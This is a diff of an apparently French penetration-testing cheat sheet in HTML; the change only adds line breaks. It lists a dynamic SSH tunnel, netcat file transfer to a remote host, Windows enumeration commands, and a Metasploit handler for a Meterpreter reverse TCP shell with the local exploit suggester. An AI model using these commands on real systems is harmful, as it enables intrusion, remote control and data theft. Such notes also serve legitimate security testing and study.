@@ -1,6 +1,6 @@
 <h2>Unix</h2>
-Accorder les permissions pour un user specifique
-setfacl -m u:username:rwx myfolder
+Accorder les permissions pour un user specifique</br>
+setfacl -m u:username:rwx myfolder</br>
 Tunnel ssh dynamique sur le port local 8080:</br>
 ssh -ND 8080 root@addressIP</br>
 <h3>Obtenir un shell</h3>
@@ -16,20 +16,20 @@ nc -l -p 1234 > out.file</br>
 nc -w 3 [destination] 1234 < out.file</br>
 
 <h2>Windows</h2>
-systeminfo pour obtenir des renseignements sur le systeme
-net users [username] pour obtenir des renseignements sur les utilisateurs
-tasklist pour lister les processus
-netstat -ano pour les connexions reseau
-dir sysprep /s /b pour trouver un fichier dans le repertoire courant et ses sous-dossiers
+systeminfo pour obtenir des renseignements sur le systeme</br>
+net users [username] pour obtenir des renseignements sur les utilisateurs</br>
+tasklist pour lister les processus</br>
+netstat -ano pour les connexions reseau</br>
+dir sysprep /s /b pour trouver un fichier dans le repertoire courant et ses sous-dossiers</br>
 
 
 <h2>Metasploit</h2>
-Handler :
-use exploit/multi/handler
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST 192.168.8.142
-set LPORT 8888
-set ExitOnSession false
-exploit -j -z
+Handler :</br>
+use exploit/multi/handler</br>
+set PAYLOAD windows/x64/meterpreter/reverse_tcp</br>
+set LHOST 192.168.8.142</br>
+set LPORT 8888</br>
+set ExitOnSession false</br>
+exploit -j -z</br>
 
-use post/multi/recon/local_exploit_suggester
+use post/multi/recon/local_exploit_suggester</br>
